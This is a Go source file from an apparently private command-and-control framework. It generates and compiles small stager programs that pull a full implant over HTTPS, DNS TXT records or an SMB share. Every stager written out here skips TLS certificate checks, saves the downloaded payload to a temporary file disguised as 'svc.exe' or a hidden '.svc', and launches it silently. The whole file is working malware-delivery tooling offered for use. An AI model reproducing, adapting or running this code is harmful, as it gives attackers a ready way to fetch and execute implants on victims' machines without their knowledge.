package stages

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/azizbinmohammad/private-c2/server/build"
)

// StagerType defines the kind of stager to generate.
type StagerType string

const (
	StagerHTTPS StagerType = "https"
	StagerDNS   StagerType = "dns"
	StagerSMB   StagerType = "smb"
)

// StagerConfig holds the configuration for a stager payload.
type StagerConfig struct {
	Type      StagerType
	StageURL  string // URL to download the full implant from
	TargetOS  string
	TargetArch string
}

// StagerResult holds the output of the stager generation stage.
type StagerResult struct {
	SourcePath string
	StagerType StagerType
}

// GenerateStager produces a small download-and-execute stager payload source.
// Stagers are minimal binaries that fetch the full implant from a staging
// server, write it to a temporary location, and execute it.
func GenerateStager(cfg *StagerConfig, workDir string) (*StagerResult, error) {
	if cfg.StageURL == "" {
		return nil, fmt.Errorf("stage URL is required")
	}

	stagerDir := filepath.Join(workDir, "stager_src")
	if err := os.MkdirAll(stagerDir, 0o700); err != nil {
		return nil, fmt.Errorf("create stager dir: %w", err)
	}

	var source string
	switch cfg.Type {
	case StagerHTTPS:
		source = generateHTTPSStager(cfg)
	case StagerDNS:
		source = generateDNSStager(cfg)
	case StagerSMB:
		source = generateSMBStager(cfg)
	default:
		source = generateHTTPSStager(cfg)
	}

	sourcePath := filepath.Join(stagerDir, "main.go")
	if err := os.WriteFile(sourcePath, []byte(source), 0o600); err != nil {
		return nil, fmt.Errorf("write stager source: %w", err)
	}

	return &StagerResult{
		SourcePath: sourcePath,
		StagerType: cfg.Type,
	}, nil
}

// CompileStager compiles a stager source into a binary using the same
// cross-compilation approach as the full implant.
func CompileStager(stagerResult *StagerResult, targetOS, targetArch, workDir string) (string, error) {
	stagerCfg := &build.BuildConfig{
		TargetOS:     targetOS,
		TargetArch:   targetArch,
		Mode:         "session",
		OutputFormat: "exe",
		C2Servers:    []string{"placeholder"},
		Transports:   []string{"https"},
	}

	configResult := &ConfigureResult{
		SourceDir: filepath.Dir(stagerResult.SourcePath),
		BuildTags: []string{"stager"},
	}

	result, err := Compile(nil, stagerCfg, configResult, workDir)
	if err != nil {
		return "", fmt.Errorf("compile stager: %w", err)
	}

	return result.OutputPath, nil
}

// generateHTTPSStager generates Go source for an HTTPS-based stager.
func generateHTTPSStager(cfg *StagerConfig) string {
	var sb strings.Builder

	sb.WriteString("package main\n\n")
	sb.WriteString("import (\n")
	sb.WriteString("\t\"crypto/tls\"\n")
	sb.WriteString("\t\"io\"\n")
	sb.WriteString("\t\"net/http\"\n")
	sb.WriteString("\t\"os\"\n")
	sb.WriteString("\t\"os/exec\"\n")
	sb.WriteString("\t\"path/filepath\"\n")
	sb.WriteString(")\n\n")
	sb.WriteString("func main() {\n")
	sb.WriteString(fmt.Sprintf("\tstageURL := %q\n", cfg.StageURL))
	sb.WriteString("\tclient := &http.Client{\n")
	sb.WriteString("\t\tTransport: &http.Transport{\n")
	sb.WriteString("\t\t\tTLSClientConfig: &tls.Config{InsecureSkipVerify: true},\n")
	sb.WriteString("\t\t},\n")
	sb.WriteString("\t}\n")
	sb.WriteString("\tresp, err := client.Get(stageURL)\n")
	sb.WriteString("\tif err != nil {\n")
	sb.WriteString("\t\treturn\n")
	sb.WriteString("\t}\n")
	sb.WriteString("\tdefer resp.Body.Close()\n")
	sb.WriteString("\tdata, err := io.ReadAll(resp.Body)\n")
	sb.WriteString("\tif err != nil {\n")
	sb.WriteString("\t\treturn\n")
	sb.WriteString("\t}\n")

	// Write to temp and execute
	sb.WriteString("\ttmpDir := os.TempDir()\n")

	if cfg.TargetOS == "windows" {
		sb.WriteString("\toutPath := filepath.Join(tmpDir, \"svc.exe\")\n")
	} else {
		sb.WriteString("\toutPath := filepath.Join(tmpDir, \".svc\")\n")
	}

	sb.WriteString("\tif err := os.WriteFile(outPath, data, 0o700); err != nil {\n")
	sb.WriteString("\t\treturn\n")
	sb.WriteString("\t}\n")
	sb.WriteString("\tcmd := exec.Command(outPath)\n")
	sb.WriteString("\t_ = cmd.Start()\n")
	sb.WriteString("}\n")

	return sb.String()
}

// generateDNSStager generates Go source for a DNS-based stager that
// retrieves the payload via TXT record queries.
func generateDNSStager(cfg *StagerConfig) string {
	var sb strings.Builder

	sb.WriteString("package main\n\n")
	sb.WriteString("import (\n")
	sb.WriteString("\t\"encoding/base64\"\n")
	sb.WriteString("\t\"net\"\n")
	sb.WriteString("\t\"os\"\n")
	sb.WriteString("\t\"os/exec\"\n")
	sb.WriteString("\t\"path/filepath\"\n")
	sb.WriteString("\t\"sort\"\n")
	sb.WriteString("\t\"strings\"\n")
	sb.WriteString(")\n\n")
	sb.WriteString("func main() {\n")
	sb.WriteString(fmt.Sprintf("\tdomain := %q\n", cfg.StageURL))
	sb.WriteString("\tvar chunks []string\n")
	sb.WriteString("\tfor i := 0; i < 256; i++ {\n")
	sb.WriteString("\t\tquery := strings.Join([]string{string(rune('0'+i/100)), string(rune('0'+(i/10)%%10)), string(rune('0'+i%%10))}, \"\") + \".\" + domain\n")
	sb.WriteString("\t\ttxts, err := net.LookupTXT(query)\n")
	sb.WriteString("\t\tif err != nil || len(txts) == 0 {\n")
	sb.WriteString("\t\t\tbreak\n")
	sb.WriteString("\t\t}\n")
	sb.WriteString("\t\tchunks = append(chunks, txts...)\n")
	sb.WriteString("\t}\n")
	sb.WriteString("\tsort.Strings(chunks)\n")
	sb.WriteString("\tpayload := strings.Join(chunks, \"\")\n")
	sb.WriteString("\tdata, err := base64.StdEncoding.DecodeString(payload)\n")
	sb.WriteString("\tif err != nil {\n")
	sb.WriteString("\t\treturn\n")
	sb.WriteString("\t}\n")
	sb.WriteString("\ttmpDir := os.TempDir()\n")
	sb.WriteString("\toutPath := filepath.Join(tmpDir, \".svc\")\n")
	sb.WriteString("\tif err := os.WriteFile(outPath, data, 0o700); err != nil {\n")
	sb.WriteString("\t\treturn\n")
	sb.WriteString("\t}\n")
	sb.WriteString("\tcmd := exec.Command(outPath)\n")
	sb.WriteString("\t_ = cmd.Start()\n")
	sb.WriteString("}\n")

	return sb.String()
}

// generateSMBStager generates Go source for an SMB-based stager that
// reads the payload from a network share.
func generateSMBStager(cfg *StagerConfig) string {
	var sb strings.Builder

	sb.WriteString("package main\n\n")
	sb.WriteString("import (\n")
	sb.WriteString("\t\"os\"\n")
	sb.WriteString("\t\"os/exec\"\n")
	sb.WriteString("\t\"path/filepath\"\n")
	sb.WriteString(")\n\n")
	sb.WriteString("func main() {\n")
	sb.WriteString(fmt.Sprintf("\tsharePath := %q\n", cfg.StageURL))
	sb.WriteString("\tdata, err := os.ReadFile(sharePath)\n")
	sb.WriteString("\tif err != nil {\n")
	sb.WriteString("\t\treturn\n")
	sb.WriteString("\t}\n")
	sb.WriteString("\ttmpDir := os.TempDir()\n")
	sb.WriteString("\toutPath := filepath.Join(tmpDir, \".svc\")\n")
	sb.WriteString("\tif err := os.WriteFile(outPath, data, 0o700); err != nil {\n")
	sb.WriteString("\t\treturn\n")
	sb.WriteString("\t}\n")
	sb.WriteString("\tcmd := exec.Command(outPath)\n")
	sb.WriteString("\t_ = cmd.Start()\n")
	sb.WriteString("}\n")

	return sb.String()
}
